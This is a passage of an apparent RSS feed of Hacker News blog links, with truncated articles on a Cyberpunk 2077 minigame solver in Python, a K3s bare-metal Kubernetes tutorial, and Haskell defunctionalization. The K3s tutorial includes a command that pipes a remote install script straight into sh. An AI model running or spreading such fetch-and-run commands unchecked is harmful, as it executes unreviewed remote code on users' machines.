	# show_selection_mark: true

	###############################################################
	# Column order
	# cols_order, if specified, must be a permutation of the following
	# array. You should keep the name at the end as it has a variable
	# length.
	#
	# cols_order: [
	# 	</span><span>mark</span><span>
	# 	</span><span>git</span><span>
	# 	</span><span>size</span><span>
	# 	</span><span>permission</span><span>
	# 	</span><span>date</span><span>
	# 	</span><span>count</span><span>
	# 	</span><span>branch</span><span>
	# 	</span><span>name</span><span>
	# ]

	###############################################################
	# True Colors
	# If this parameter isn'</span><span>t set, broot tries to automatically</span><span>
</span><span>	# …</span></code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dystroy.org/blog/hjson-in-broot/">https://dystroy.org/blog/hjson-in-broot/</a></em></p>]]>
            </description>
            <link>https://dystroy.org/blog/hjson-in-broot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505892</guid>
            <pubDate>Tue, 22 Dec 2020 13:14:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cyberpwned: Beating Cyberpunk 2077's hacking minigame with Python]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25505848">thread link</a>) | @asicsp
<br/>
December 22, 2020 | https://nicolas-siplis.com/blog/cyberpwned | <a href="https://web.archive.org/web/*/https://nicolas-siplis.com/blog/cyberpwned">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h3>
                Cyberpwned: Beating Cyberpunk 2077's hacking minigame in 50 lines of Python
            </h3>
            <p>
                December 20, 2020
            </p><p>
                If you have a passing interest in anything gaming related and haven't been living under a rock for the last couple years, you're probably somewhat familiar with Cyberpunk 2077.
                After a long and repeatedly extended wait, it's finally here! And it has a hacking minigame! And getting a good score gets you better gear! 
                Can some quick Python magic give us the edge we need in this cruel, cruel Net? You bet. 
            </p>
            
            <p>
                A quick overview of the minigame: You're given a square matrix and one or more sequences of hexadecimal numbers, along with a buffer of certain length. 
                Your goal is to complete the most amount of sequences choosing as many nodes as the buffer allows.
                Each sequence will advance in progress if the node chosen is the next node in the sequence.
                When the game starts, you may choose any of the values in the first row of the matrix.
                After that, the values you can choose will alternate between the Nth column/row each turn, with N being the index of the last picked value.
                If this horrible description wasn't helpful, click <a href="https://www.rockpapershotgun.com/2020/12/14/cyberpunk-2077-hacking-minigame-breach-protocol-explained/">here</a> for a more detailed one, courtesy of RPS.
            </p>
            
            <p>
                All valid paths are considered and the final score of each path is calculated depending on how many sequences were completed by traversing it.
                The path with the best score is then printed to screen.
                The algorithm itself isn't particularly interesting nor efficient, unfortunately. However, it should be fast enough to solve any of Cyberpunk's minigames in a few seconds, so fast enough!
                I'm sure there's some low hanging fruit that could speed up execution, but I thought I'd share what I have so far and update the post as new ideas/suggestions come up.
            </p>
            

            <p>
                Let's start off with the game's components:
                    </p><ul>
                        <li>Code Matrix: Multidimensional array containing hexadecimal values (nodes), the "gameboard"</li>
                            <pre><code>
code_matrix = [
    [0x1c, 0xbd, 0x55, 0xe9, 0x55], 
    [0x1c, 0xbd, 0x1c, 0x55, 0xe9],
    [0x55, 0xe9, 0xe9, 0xbd, 0xbd],
    [0x55, 0xff, 0xff, 0x1c, 0x1c],
    [0xff, 0xe9, 0x1c, 0xbd, 0xff]
]
                            </code></pre>
                        <li>Buffer: Number indicating maximum number of chosen coordinates</li>
                            <pre><code>
buffer_size = 7
                            </code></pre>
                        <li>Coordinate: Specific point in the code matrix</li>
                        <li>Path: Ordered collection of unique coordinates which the user accessed</li>
                            <pre><code>
# The same coordinate can't be chosen more than once per path
class DuplicatedCoordinateException(Exception):
    pass

# All paths match the following pattern:
# [(0, a), (b, a), (b, c), (d, c), ...]
class Path():
    def __init__(self, coords=[]):
        self.coords = coords

    def __add__(self, other):
        new_coords = self.coords + other.coords
        if any(map(lambda coord: coord in self.coords, other.coords)):
            raise DuplicatedCoordinateException()
        return Path(new_coords)

    def __repr__(self):
        return str(self.coords)
                            </code></pre>
                        <li>Sequence: Paths that offer varying quality rewards if completed</li>
                            <pre><code>
sequences = [
    [0x1c, 0x1c, 0x55],
    [0X55, 0Xff, 0X1c],
    [0xbd, 0xe9, 0xbd, 0x55],
    [0x55, 0x1c, 0xff, 0xbd]
]
                            </code></pre>
                        <li>Score: Calculation that can be tweaked to prioritize different rewards</li>
                            <pre><code>
class SequenceScore():

    def __init__(self, sequence, buffer_size, reward_level=0):
        self.max_progress = len(sequence)
        self.sequence = sequence
        self.score = 0
        self.reward_level = reward_level
        self.buffer_size = buffer_size

    def compute(self, compare):
        if not self.__completed():
            if self.sequence[self.score] == compare:
                self.__increase()
            else:
                self.__decrease()

    # When the head of the sequence matches the targeted node, increase the score by 1
    # If the sequence has been completed, set the score depending on the reward level
    def __increase(self):
        self.buffer_size -= 1
        self.score += 1
        if self.__completed():
            # Can be adjusted to maximize either:
            #   a) highest quality rewards, possibly lesser quantity
            self.score = 10 ** (self.reward_level + 1)
            #   b) highest amount of rewards, possibly lesser quality
            # self.score = 100 * (self.reward_level + 1)

    # When an incorrect value is matched against the current head of the sequence, the score is decreased by 1 (can't go below 0)
    # If it's not possible to complete the sequence, set the score to a negative value depending on the reward 
    def __decrease(self):
        self.buffer_size -= 1
        if self.score &gt; 0:
            self.score -= 1
        if self.__completed():
            self.score = -self.reward_level - 1

    # A sequence is considered completed if no further progress is possible or necessary
    def __completed(self):
        return self.score &lt; 0 or self.score &gt;= self.max_progress or self.buffer_size &lt; self.max_progress - self.score

class PathScore():
    
    def __init__(self, path, sequences, buffer_size):
        self.score = None
        self.path = path
        self.sequence_scores = [SequenceScore(sequence, buffer_size, reward_level) for reward_level, sequence in enumerate(sequences)]
    
    def compute(self): # Returns the sum of the individual sequence scores
        if self.score != None:
            return self.score
        for row, column in self.path.coords:
            for seq_score in self.sequence_scores:
                seq_score.compute(code_matrix[row][column])
        self.score = sum(map(lambda seq_score: seq_score.score, self.sequence_scores))
        return self.score
                            </code></pre>
                    </ul>
            

            <p>
                The path generation is pretty similar to a DFS graph traversal. 
                The only significant difference is that the nodes accessible will vary depending on the current turn and the previous node's coordinates.  
            </p>
            <pre><code>
# Returns all possible paths with size equal to the buffer
def generate_paths(buffer_size):
    completed_paths = []

    # Return next available row/column for specified turn and coordinate.
    # If it's the 1st turn the index is 0 so next_line would return the 
    # first row. For the second turn, it would return the nth column, with n
    # being the coordinate's row
    def candidate_coords(turn=0, coordinate=(0,0)):
        if turn % 2 == 0:
            return [(coordinate[0], column) for column in range(len(code_matrix))]
        else:
            return [(row, coordinate[1]) for row in range(len(code_matrix))]

    # The stack contains all possible paths currently being traversed.
    def _walk_paths(buffer_size, completed_paths, partial_paths_stack = [Path()], turn = 0, candidates = candidate_coords()):
    
        path = partial_paths_stack.pop()
        
        for coord in candidates:
            try:
                new_path = path + Path([coord])
            
            # Skip coordinate if it has already been visited
            except DuplicatedCoordinateException:
                continue

            # Full path is added to the final return list and removed from the partial paths stack
            if len(new_path.coords) == buffer_size:
                completed_paths.append(new_path) 
            else: # Add new, lengthier partial path back into the stack
                partial_paths_stack.append(new_path) 
                _walk_paths(buffer_size, completed_paths, partial_paths_stack, turn + 1, candidate_coords(turn + 1, coord))

    _walk_paths(buffer_size, completed_paths)
    return completed_paths
            </code></pre>

            <p>
                Let's run it and check that everything is working correctly.
                While most of the breach protocol minigames have randomized values, the "Spellbound" quest involves a fixed state and the best solution is already known. Courtesy of GamerJournalist:
                <img src="https://img.gamerjournalist.com/spai/w_1024+q_lossy+ret_img+to_webp/https://cdn.gamerjournalist.com/primary/2020/12/How-to-decrypt-the-Book-of-Spells-in-Cyberpunk-2077.jpg">
            </p>

            <pre><code>
paths = [(path, PathScore(path, sequences, buffer_size).compute()) for path in generate_paths(buffer_size)]
max_path = max(paths, key=lambda path: path[1])
# [(0, 1), (2, 1), (2, 3), (1, 3), (1, 0), (4, 0), (4, 3)] -&gt; Should traverse 3rd and 4th sequences, finishes in ~3 seconds
print(max_path[0])
            </code></pre>

            <p>
                Success! Out of curiosity, I thought I'd try increasing the buffer size until I could find a path which cleared all sequences. 
                Be warned though, the result might take some time to compute since it has to go through every possible path of length 11.
            </p>
            <pre><code>
buffer_size = 11
paths = [(path, PathScore(path, sequences, buffer_size).compute()) for path in generate_paths(buffer_size)]
max_path = max(paths, key=lambda path: path[1])

# [(0, 0), (1, 0), (1, 3), (3, 3), (3, 1), (0, 1), (0, 3), (2, 3), (2, 0), (4, 0), (4, 2)] -&gt; Should traverse all sequences, finishes in ~40 seconds
print(max_path[0], max_path[1])
            </code></pre>

            <p>
                OK, optimization time! We'll assume that there's at least 1 path with a non-negative score.
                That way, we can actually stop traversing a partial path if its current score (adjusted depending on buffer's size and current turn) is lower than 0.
            </p>

            <pre><code>
def generate_paths(...):
    ...
    def _walk_paths(...):
    ...

                # Full path is added to the final return list and removed from the partial paths stack
                if len(new_path.coords) == buffer_size:
                    completed_paths.append(new_path)
                # If the partial path score is already lower than 0 we should be able to safely stop traversing it
                elif PathScore(new_path, sequences, buffer_size).compute() &lt; 0:
                    continue
                else: # Add new, lengthier partial path back into the stack
                    partial_paths_stack.append(new_path) 
                    _walk_paths(buffer_size, completed_paths, partial_paths_stack, turn + 1, candidate_coords(turn + 1, coord))
    ...
            </code></pre>

            <p>
                Let's try to get our original result with a buffer of length 7 again: 
            </p>

            <pre><code>
buffer_size = 7
paths = [(path, PathScore(path, sequences, buffer_size).compute()) for path in generate_paths(buffer_size)]
max_path = max(paths, …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nicolas-siplis.com/blog/cyberpwned">https://nicolas-siplis.com/blog/cyberpwned</a></em></p>]]>
            </description>
            <link>https://nicolas-siplis.com/blog/cyberpwned</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505848</guid>
            <pubDate>Tue, 22 Dec 2020 13:08:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bare-Metal Kubernetes with K3s]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 131 (<a href="https://news.ycombinator.com/item?id=25505735">thread link</a>) | @alexellisuk
<br/>
December 22, 2020 | https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><blockquote>
<p>Learn how to configure K3s on bare-metal to run a Kubernetes cluster with just as much resilience and fault tolerance as a managed service.</p>
</blockquote>
<p>This tutorial is a follow-on from my post <a href="https://blog.alexellis.io/kubernetes-in-10-minutes/">Kubernetes on bare-metal in 10 minutes</a> from 2017. The original post focused on getting <a href="https://kubernetes.io/">Kubernetes</a> working across a number of bare-metal hosts running Ubuntu, and then it went on to deploy a microservice and the dashboard. It was a primer, and written to help new users kick the tires with Kubernetes. It used production-ready kubeadm, but only used one master node, meaning it couldn't tolerate a failure.</p>
<p>In this post, I want to provide you with a HA, production-ready cluster on bare-metal infrastructure. We will use <a href="https://metal.equinix.com/">Equinix Metal</a> for the hosts, automate the boring parts, but do the rest step by step, so that you can get an understanding on what's going on under the hood.</p>
<p>In the conclusion, we will review the setup and discuss other options for running on-premises or in a homelab with Raspberry Pis. We will also compare kube-vip to other solutions for bare-metal and self-hosted networking.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/12/kube-vip-ha-k3s--6-.png" alt="kube-vip-ha-k3s--6-"></p>
<blockquote>
<p>Conceptual diagram: kubectl access provided by the stable EIP. The IngressController also has an EIP which  routes traffic for services exposed with Ingress such as the OpenFaaS gateway.</p>
</blockquote>
<p>This post also moves from kubeadm to using <a href="https://k3s.io/">K3s</a> (a <a href="https://cncf.io/">CNCF</a> project), which requires fewer resources for its control-plane and has a built-in HA mode using embedded <a href="https://etcd.io/">etcd</a>. K3s has been generally available (GA) and production ready since 2019.</p>
<blockquote>
<p><a href="https://twitter.com/alexellisuk">Follow me on Twitter @alexellisuk</a></p>
</blockquote>
<h2 id="tutorial">Tutorial</h2>
<p>We will use <a href="https://www.terraform.io/">Terraform</a> to create the nodes on <a href="https://metal.equinix.com/">Equinix Metal (aka Packet)</a> servers, k3s to create a HA control-plane, and <a href="https://kube-vip.io/">kube-vip</a> to configure a HA IP address for the API server.</p>
<p>The setup will be able to tolerate at least one failure of a server. So unlike the 2017 post, our servers will form a HA cluster, and will also have an Elastic IP (EIP) configured so that the Kubernetes API server will remain accessible if one or more of the servers becomes unavailable.</p>
<p>In a Kubernetes cluster, the Cloud Controller Manager add-on has several responsibilities including node management, routing and managing services. At the end of the tutorial, not only will your cluster have a HA control-plane, a stable IP for the API Server, but Equinix Metal's (CCM) will also allow you to expose services as type LoadBalancer. Each IP address costs around 3.25 USD / mo, you can find out more details on the IP Addresses section of the dashboard.</p>
<p>Skill level: intermediate to advanced. You should be familiar with Kubernetes, networking and public cloud infrastructure.</p>
<h3 id="installtheprerequisites">Install the pre-requisites</h3>
<p>Download <a href="https://get-arkade.dev/">arkade</a>, a portable Kubernetes marketplace and downloader for DevOps CLIs. It will be used to download the tools we need for the tutorial. You are of course welcome to do things the hard way, if you prefer.</p>
<pre><code>curl -sLS https://dl.get-arkade.dev | sh

# Install the binary using the command given as output, such as: 
sudo cp arkade-darwin /usr/local/bin/arkade

# Or on Linux:
sudo cp arkade /usr/local/bin/arkade
</code></pre>
<p>Download the following CLIS:</p>
<ul>
<li><code>kubectl</code> - the Kubernetes CLI</li>
<li><code>k3sup</code> - a k3s installer that works over SSH</li>
<li><code>terraform</code> - an Infrastructure as code (IaC) tool, which we'll used to create the initial hosts</li>
<li><code>kubectx</code> - a fast way to check and switch your Kubernetes context between clusters</li>
</ul>
<pre><code>arkade get kubectl
arkade get k3sup
arkade get terraform
arkade get kubectx
</code></pre>
<p>Follow the step to put these binaries into your PATH:</p>
<pre><code># Add (k3sup) to your PATH variable
export PATH=$PATH:$HOME/.arkade/bin/
</code></pre>
<h3 id="provisionyournodes">Provision your nodes</h3>
<p>We will use terraform to provision three servers and two agents. You can alter these numbers, but three is the minimum number required for K3s' built-in HA mode using etcd.</p>
<p>You may well ask why the entire blog post isn't just a single Terraform command. I can hear you Hacker News. This point of this post isn't to do all the work for you, but to help you understand what is required, and in what order. Creating hosts is boring, so we are going to automate that and save you some time.</p>
<p>Save <code>main.tfvars</code> with the following:</p>
<pre><code>terraform {
  required_providers {
    packet = {
      source = "terraform-providers/packet"
      version = "~&gt; 3.2.1"
    }
  }
  required_version = "&gt;= 0.13"
}

variable "api_token" {
  description = "Equinix Metal API token"
}

variable "project_id" {
  description = "Equinix Metal Project ID"
}

variable "servers" {
  description = "Count of servers"
}

variable "agents" {
  description = "Count of agents"
}

provider "packet" {
  auth_token=var.api_token
}

resource "packet_ssh_key" "key1" {
  name       = "k3sup-1"
  public_key = file("/home/alex/.ssh/id_rsa.pub")
}

resource "packet_device" "k3s-server" {
  count		         = var.servers
  hostname         = "k3s-server-${count.index+1}"
  plan             = "c1.small.x86"
  facilities       = ["ams1"]
  operating_system = "ubuntu_20_10"
  billing_cycle    = "hourly"
  project_id       = var.project_id
  depends_on       = [packet_ssh_key.key1]
}

resource "packet_device" "k3s-agent" {
  count 	         = var.agents
  hostname         = "k3s-agent-${count.index+1}"
  plan             = "c1.small.x86"
  facilities       = ["ams1"]
  operating_system = "ubuntu_20_10"
  billing_cycle    = "hourly"
  project_id       = var.project_id
  depends_on       = [packet_ssh_key.key1]
}

output "server_ips" {
  value = packet_device.k3s-server.*.access_public_ipv4
}

output "agent_ips" {
  value = packet_device.k3s-agent.*.access_public_ipv4
}
</code></pre>
<p>Then create <code>main.tfvars</code></p>
<pre><code>api_token   =   ""
project_id  =   ""
servers     =   3
agents      =   2
</code></pre>
<p>Edit <code>api_token</code> and <code>project_id</code> with the values from the Equinix Metal dashboard. The API key is found on your user profile.</p>
<p>If you wish to change the size of the nodes, you can edit <code>c1.small.x86</code> and use a different value. You can find the options in your dashboard.</p>
<p>Now run the terraform to create the hosts:</p>
<pre><code>terraform init
terraform plan -var-file=main.tfvars
terraform apply -var-file=main.tfvars
</code></pre>
<p>When the hosts have been created, you'll get output with your IP addresses.</p>
<pre><code>agent_ips = [
  "147.75.81.203",
  "147.75.33.3",
]
server_ips = [
  "147.75.32.35",
  "147.75.80.83",
  "147.75.32.99",
]
</code></pre>
<p>Open a terminal and write environment variables for each:</p>
<pre><code>export SERVER1=""
export SERVER2=""
export SERVER3=""

export AGENT1=""
export AGENT2=""
</code></pre>
<p>Save this file as <code>hosts.txt</code> as you may need it again later.</p>
<h3 id="obtainanipaddressforthecontrolplane">Obtain an IP address for the control-plane</h3>
<p>K3s can run in a HA mode, where a failure of a master node can be tolerated. This isn't enough for public-facing clusters, where a stable IP address for the Kubernetes control-plane is required.</p>
<p>We need a stable IP for port 6443, which we could also call an Elastic IP or EIP. Fortunately BGP can help us there. One of our three master nodes will advertise its IP address as the route for the EIP, then if it goes down, another will start advertising. This means our clients can always depend on a stable address of: <code>https://$EIP:6443</code> for connecting to the Kubernetes API server.</p>
<p>Obtain an IP address from your EM dashboard:</p>
<ul>
<li>
<p>IPs &amp; Networks</p>
</li>
<li>
<p>Request IP Address</p>
</li>
<li>
<p>Select the same region that you'll use for the nodes:</p>
</li>
<li>
<p>Pick a <code>/32</code> for a single IP for the control-plane.</p>
</li>
</ul>
<p>It may take some time for an engineer to approve the request.</p>
<p>Once you have the IP, set it in an environment variable:</p>
<pre><code>export EIP="147.75.100.237"
</code></pre>
<p>Add this line to <code>hosts.txt</code> so that you have it, if you need it later.</p>
<h3 id="enablebgpforeachserver">Enable BGP for each server</h3>
<p>Click on each server in the Equinix Metal dashboard. Click on its details page, then BGP. Find the Manage button on the IPv4 row and click "Enable BGP".</p>
<p>This setting allows BGP to be advertised from this server.</p>
<h3 id="provisionthefirstmaster">Provision the first master</h3>
<p>For various reasons, we can only set up kube-vip after K3s has started, so we will create the first master node:</p>
<pre><code>k3sup install \
  --ip $SERVER1 \
  --tls-san $EIP \
  --cluster \
  --k3s-channel latest \
  --k3s-extra-args "--no-deploy servicelb --disable-cloud-controller" \
  --merge \
  --local-path $HOME/.kube/config \
  --context=em-ha-k3s
</code></pre>
<ul>
<li><code>--tls-san</code> is required to advertise the EIP, so that K3s will create a valid certificate for the API server.</li>
<li>the <code>--k3s-channel</code> is specifying the latest version of K3s, which in this instance will be 1.19, by the time you run this tutorial, it may have changed, in which can you can give <code>1.19</code> as the channel, or a specific version with <code>--k3s-version</code></li>
<li>note the <code>--cluster</code> flag, which tells the server to use etcd to create a cluster for the servers we will join later on</li>
<li><code>--local-path</code>, <code>--context</code> and <code>--merge</code> all allow us to merge the KUBECONFIG from the K3s to our local file.</li>
<li>in <code>--k3s-extra-args</code> we disable the built-in K3s service load-balancer, and also disable the cloud-controller, because we will use the Equinix Metal Cloud Controller Manager instead.</li>
</ul>
<p>Now check your kubeconfig file is pointing at the right cluster:</p>
<pre><code>kubectx em-ha-k3s
</code></pre>
<p>Try querying the nodes in the cluster:</p>
<pre><code>[alex@nuc ~]$ kubectl get nodes
NAME           STATUS     ROLES         AGE   VERSION
k3s-server-1   Ready      etcd,master   7s    v1.19.5+k3s2
</code></pre>
<p>Apply the RBAC so that kube-vip can access the Kubernetes API and configure services:</p>
<pre><code>kubectl apply -f https://kube-vip.io/manifests/rbac.yaml
</code></pre>
<p>Now log into the first server using SSH. There is a one-time configuration option required for each server.</p>
<pre><code>ssh root@$SERVER1

ctr image pull docker.io/plndr/kube-vip:0.3.0

alias kube-vip="ctr run --rm --net-host docker.io/plndr/kube-vip:0.3.0"
export INTERFACE=lo
export EIP="147.75.100.237"

kube-vip vip /kube-vip manifest daemonset \
  --interface $INTERFACE \
  --vip $EIP \
  --controlplane \
  --services \
  --inCluster \
  --taint \
  --bgp \
  --packet \
  --provider-config /etc/cloud-sa/cloud-sa.json | tee /var/lib/rancher/k3s/server/manifests/vip.yaml
</code></pre>
<p>The manifest for kube-vip will be created at <code>/var/lib/rancher/k3s/server/manifests/vip.yaml</code>, any files placed here will be run by K3s.</p>
<p>Log out of the server</p>
<h3 id="deploytheequinixmetalcloudcontrollermanager">Deploy the Equinix Metal …</h3></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/">https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505735</guid>
            <pubDate>Tue, 22 Dec 2020 12:50:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don’t Think, Just Defunctionalize]]>
            </title>
            <description>
<![CDATA[
Score 112 | Comments 42 (<a href="https://news.ycombinator.com/item?id=25505701">thread link</a>) | @gbrown_
<br/>
December 22, 2020 | https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize | <a href="https://web.archive.org/web/*/https://www.joachim-breitner.de/blog/778-Don%E2%80%99t_think%2C_just_defunctionalize">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: CPS-conversion and defunctionalization can help you to come up with a constant-stack algorithm.</p>
<p><em>Update:</em> Turns out I inadvertedly plagiarized the talk <a href="https://t.co/YlN0MOnN83?amp=1">The Best Refactoring You’ve Never Heard Of</a> by James Koppel. Please consider this a form of sincere flattery.</p>
<h3 id="the-starting-point">The starting point</h3>
<p>Today, I’ll take you on a another little walk through the land of program transformations. Let’s begin with a simple binary tree, with value of unknown type in the leaves, as well as the canonical <code>map</code> function:</p>
<div><pre><code><span>data</span> <span>T</span> a <span>=</span> <span>L</span> a <span>|</span> <span>B</span> (<span>T</span> a) (<span>T</span> a)

<span>map1 ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map1 f (<span>L</span> x) <span>=</span> <span>L</span> (f x)
map1 f (<span>B</span> t1 t2) <span>=</span> <span>B</span> (map1 f t1) (map1 f t2)</code></pre></div>
<p>As you can see, this <code>map</code> function is using the program stack as it traverses the tree. Our goal is now to come up with a <code>map</code> function that does <em>not</em> use the stack!</p>
<p>Why? Good question! In Haskell, there wouldn’t be a strong need for this, as the Haskell stack is allocated on the heap, just like your normal data, so there is plenty of stack space. But in other languages or environments, the stack space may have a hard limit, and it may be advised to not use unbounded stack space.</p>
<p>That aside, it’s a fun exercise, and that’s sufficient reason for me.</p>
<p>(In the following, I assume that tail-calls, i.e. those where a function end with another function call, but without modifying its result, do not actually use stack space. Once <em>all</em> recursive function calls are tail calls, the code is equivalent to an imperative loop, as we will see.)</p>
<h3 id="think">Think?</h3>
<p>We <em>could</em> now just stare at the problem (rather the code), and try to come up with a solution directly. We’d probably think “ok, as I go through the tree, I have to remember all the nodes <em>above</em> me… so I need a list of those nodes… and for each of these nodes, I also need to remember whether I am currently processing the left child, and yet have to look at the right one, or whether I am done with the left child… so what do I have to remember about the current node…?”</p>
<p>… ah, my brain spins already. Maybe eventually I figure it out, but why think when we can <em>derive</em> the solution? So let’s start with above <code>map1</code>, and rewrite it, in several, mechanical, steps into a stack-less, tail-recursive solution.</p>
<h3 id="go">Go!</h3>
<p>Before we set out, let me rewrite the <code>map</code> function using a local <code>go</code> helper, as follows:</p>
<div><pre><code><span>map2 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map2 f t <span>=</span> go t
  <span>where</span>
<span>    go ::</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
    go (<span>L</span> x) <span>=</span> <span>L</span> (f x)
    go (<span>B</span> t1 t2) <span>=</span> <span>B</span> (go t1) (go t2)</code></pre></div>
<p>This transformation (effectively the “static argument transformation”) has the nice advantage that we do not have to pass <code>f</code> around all the time, and that when we copy the function, I only have to change the top-level name, but not the names of the inner functions.</p>
<p>Also, I find it more aesthetically pleasing.</p>
<h3 id="cps">CPS</h3>
<p>A blunt, effective tool to turn code that is not yet using tail-calls into code that only uses tail-calls is use <em>continuation-passing style</em>. If we have a function of type <code>… -&gt; t</code>, we turn it into a function of type <code>… -&gt; (t -&gt; r) -&gt; r</code>, where <code>r</code> is the type of the result we want at the very end. This means the function now receives an extra argument, often named <code>k</code> for continuation, and instead of returning some <code>x</code>, the function calls <code>k x</code>.</p>
<p>We can apply this to our <code>go</code> function. Here, both <code>t</code> and <code>r</code> happen to be <code>T b</code>; the type of finished trees:</p>
<pre><code>map3 :: forall a b. (a -&gt; b) -&gt; T a -&gt; T b
map3 f t = go t (\r -&gt; r)
  where
    go :: T a -&gt; (T b -&gt; T b) -&gt; T b
    go (L x) k  = k (L (f x))
    go (B t1 t2) k  = go t1 (\r1 -&gt; go t2 (\r2 -&gt; k (B r1 r2)))</code></pre>
<p>Note that when initially call <code>go</code>, we pass the identity function <code>(\r -&gt; r)</code> as the initial continuation.</p>
<p>Alas, suddenly all function calls are in tail position, and this codes does not use stack space! Technically, we are done, although it is not quite satisfying; all these lambdas floating around obscure the meaning of the code, are maybe a bit slow to execute, and also, we didn’t really learn much yet. This is certainly <em>not</em> the code we would have writing after “thinking hard”.</p>
<h3 id="defunctionalization">Defunctionalization</h3>
<p>So let’s continue rewriting the code to something prettier, simpler. Something that does not use lambdas like this.</p>
<p>Again, there is a mechanical technique that can help it. It likely won't make the code prettier, but it will get rid of the lambdas, so let’s do that an clean up later.</p>
<p>The technique is called <em>defunctionalization</em> (because it replaces functional values by plain data values), and can be seen as a form of <em>refinement</em>.</p>
<p>Note that we pass around vales of type <code>(T b -&gt; T b)</code>, but we certainly don’t <em>mean</em> the full type <code>(T b -&gt; T b)</code>. Instead, only very specific values of that type occur in our program, So let us replace <code>(T b -&gt; T b)</code> with a data type that contains representatives of <em>just</em> the values we actually use.</p>
<ol>
<li><p>We find at all values of type <code>(T b -&gt; T b)</code>. These are:</p>
<ul>
<li><code>(\r -&gt; r)</code></li>
<li><code>(\r1 -&gt; go t2 (\r2 -&gt; k (B r1 r2)))</code></li>
<li><code>(\r2 -&gt; k (B r1 r2))</code></li>
</ul></li>
<li><p>We create a datatype with one constructor for each of these:</p>

<p>(This is not complete yet.)</p></li>
<li><p>We introduce an <em>interpretation</em> function that turns a <code>K</code> back into a <code>(T b -&gt; T b)</code>:</p>
<div><pre><code><span>eval ::</span> <span>K</span> <span>-&gt;</span> (<span>T</span> b <span>-&gt;</span> <span>T</span> b)
eval <span>=</span> (<span>*</span> <span>TBD</span> <span>*</span>)</code></pre></div></li>
<li><p>In the function <code>go</code>, instead of taking a parameter of type <code>(T b -&gt; T b)</code>, we take a <code>K</code>. And when we actually <em>use</em> the continuation, we have to turn the <code>K</code> back to the function using eval:</p>
<div><pre><code><span>go ::</span> <span>T</span> a <span>-&gt;</span> <span>K</span> a b <span>-&gt;</span> <span>T</span> b
go (<span>L</span> x) k  <span>=</span> eval k (<span>L</span> (f x))
go (<span>B</span> t1 t2) k <span>=</span> go t1 <span>K1</span></code></pre></div>
We also do this to the code fragments identified in the first step; these become:
<ul>
<li><code>(\r -&gt; r)</code></li>
<li><code>(\r1 -&gt; go t2 K2)</code></li>
<li><code>(\r2 -&gt; eval k (B r1 r2))</code></li>
</ul></li>
<li><p>Now we complete the <code>eval</code> function: For each constructor, we simply map it to the corresponding lambda from step 1:</p>
<div><pre><code><span>eval ::</span> <span>K</span> <span>-&gt;</span> (<span>T</span> b <span>-&gt;</span> <span>T</span> b)
eval <span>I</span> <span>=</span> (\r <span>-&gt;</span> r)
eval <span>K1</span> <span>=</span> (\r1 <span>-&gt;</span> go t2 <span>K2</span>)
eval <span>K2</span> <span>=</span> (\r2 <span>-&gt;</span> eval k (<span>B</span> r1 r2))</code></pre></div></li>
<li><p>This doesn’t quite work yet: We have variables on the right hand side that are not bound (<code>t2</code>, <code>r1</code>, <code>k</code>). So let’s add them to the constructors <code>K1</code> and <code>K2</code> as needed. This also changes the type <code>K</code> itself; it now needs to take type parameters.</p></li>
</ol>
<p>This leads us to the following code:</p>
<div><pre><code><span>data</span> <span>K</span> a b
  <span>=</span> <span>I</span>
  <span>|</span> <span>K1</span> (<span>T</span> a) (<span>K</span> a b)
  <span>|</span> <span>K2</span> (<span>T</span> b) (<span>K</span> a b)

<span>map4 ::</span> forall a b<span>.</span> (a <span>-&gt;</span> b) <span>-&gt;</span> <span>T</span> a <span>-&gt;</span> <span>T</span> b
map4 f t <span>=</span> go t <span>I</span>
  <span>where</span>
<span>    go ::</span> <span>T</span> a <span>-&gt;</span> <span>K</span> a b <span>-&gt;</span> <span>T</span> b
    go (<span>L</span> x) k  <span>=</span> eval k (<span>L</span> (f x))
    go (<span>B</span> t1 t2) k  <span>=</span> go t1 (<span>K1</span> t2 k)

<span>    eval ::</span> <span>K</span> a b <span>-&gt;</span> (<span>T</span> b <span>-&gt;</span> <span>T</span> b)
    eval <span>I</span> <span>=</span> (\r <span>-&gt;</span> r)
    eval (<span>K1</span> t2 k) <span>=</span> (\r1 <span>-&gt;</span> go t2 (<span>K2</span> r1 k))
    eval (<span>K2</span> r1 k) <span>=</span> (\r2 <span>-&gt;</span> eval k (<span>B</span> r1 r2))</code></pre></div>
<p>Not really cleaner or prettier, but everything is still tail-recursive, <em>and</em> we are now working with plain data.</p>
<h3 id="we-like-lists">We like lists</h3>
<p>To clean it up a little bit, we can notice that the <code>K</code> data type really is just a list of values, where the values are either <code>T a</code> or <code>T b</code>. We do not need a custom data type for this! Instead of our <code>K</code>, we can just use the following, built from standard data types:</p>
<pre><code>type K' a b = [Either (T a) (T b)]</code></pre>
